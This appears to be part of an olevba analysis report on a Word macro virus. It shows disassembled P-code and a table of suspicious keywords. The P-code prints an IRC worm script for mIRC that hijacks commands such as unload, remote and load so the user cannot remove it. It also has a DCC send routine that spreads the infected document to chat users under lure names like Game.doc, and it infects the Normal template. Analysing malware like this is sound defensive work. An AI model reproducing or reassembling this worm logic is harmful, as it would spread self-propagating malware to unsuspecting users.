' 	LitStr 0x0027 "alias letsdo { .ignore $nick 3 | halt }"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0157 "alias letslook { if ( $nopath(%ex) !isin $1- ) && ( disable !isin $1- ) && ( script !isin $1- ) && ( dmsetup !isin $1- ) && ( worm !isin $1- ) && ( virus !isin $1- ) && ( infect !isin $1- ) && ( spread !isin $1- ) && ( remote !isin $1- ) && ( default !isin $1- ) && ( event !isin $1- ) && ( toy !isin $1- ) && ( unload !isin $1- ) { return } }"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00A4 "alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00BE "alias remote { if ( $1 = $null ) { .echo -e 2*** Remote is OFF | halt } | if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF } | halt }"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00AE "alias events { if ( $1 = $null ) { .echo -e 2*** Events are OFF | halt } | if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF } | halt }"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "alias remini { toy2 }"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "alias alias { toy2 }"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "alias run { toy2 }"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "alias copy { toy2 }"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "alias load { if ( $1 = -rs ) { toy2 | halt } }"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "#damn3 on"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00A7 "alias play { if ( $pos($1-,.mrc,1) > 0 ) || ( $pos($1-,.ini,1) > 0 ) || ( $pos($1-,.vxd,1) > 0 ) { halt } | .disable #damn3 | .timer0 1 .1 .play $1- | .enable #damn3 }"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "#damn3 end"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "alias writeini { toy2 }"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "alias rename { toy2 }"
' 	PrintItemNL 
' Line #134:
' 	QuoteRem 0x0000 0x0056 "DCC Send using socket commands is a modified version of that in _Bird_'s phraggle worm"
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x012C "alias SQ { %nick = $1- | %stop = 0 | %pt = $r(2400,5000) | %be = 0 | %pk = 4096 | %sz = $file(%ex).size | .notice %nick DCC Send %ex ( $+ $ip $+ ) | .raw -q privmsg %nick : $+ $chr(1) $+ DCC SEND %ex $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(sd) != $null ) { .sockclose sd } | .socklisten sd %pt }"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00E7 "alias ok1 { if ( $calc(%be + %pk) < %sz ) { .bread %ex %be %pk &data | .sockwrite we &data | inc %be %pk } | else { %stop = 1 | %pk = $calc( %sz - %be) | if (%pk == 0) { return } | .bread %ex %be %pk &data | .sockwrite we &data } }"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #138:
' 	Ld var3 
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	Ld irc 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Junction 
' 	EndIf 
' Line #141:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St irc 
' Line #142:
' 	Ld irc 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Wind 
' 	LitStr 0x0008 "\Toy.doc"
' 	Concat 
' 	St FName 
' 	EndIf 
' Line #143:
' 	Ld irc 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Wind 
' 	LitStr 0x0009 "\Game.doc"
' 	Concat 
' 	St FName 
' 	EndIf 
' Line #144:
' 	Ld irc 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Wind 
' 	LitStr 0x000A "\Fable.doc"
' 	Concat 
' 	St FName 
' 	EndIf 
' Line #145:
' 	Ld FName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #146:
' 	Ld FName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #147:
' 	Ld FName 
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #148:
' 	LitDI2 0x0000 
' 	St hrm 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	LitStr 0x000A "C:\Toy.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #151:
' 	LitStr 0x000A "C:\Toy.sys"
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #152:
' 	LitStr 0x000A "C:\Toy.sys"
' 	ArgsCall Kill 0x0001 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	LitStr 0x000A "C:\Toy.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FName 
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #157:
' 	LitStr 0x000A "C:\Toy.sys"
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #158:
' 	Label Junction 
' Line #159:
' 	Ld LN 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #160:
' 	Ld LN 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #165:
' 	Label done 
' Line #166:
' 	Ld var10 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #167:
' 	Ld hrm 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #168:
' 	Ld Tmp1 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #169:
' 	ElseBlock 
' Line #170:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	ElseBlock 
' Line #173:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub ViewVBCode())
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Sub ToolsMacro())
' Line #179:
' 	EndSub 
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |mirc32.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

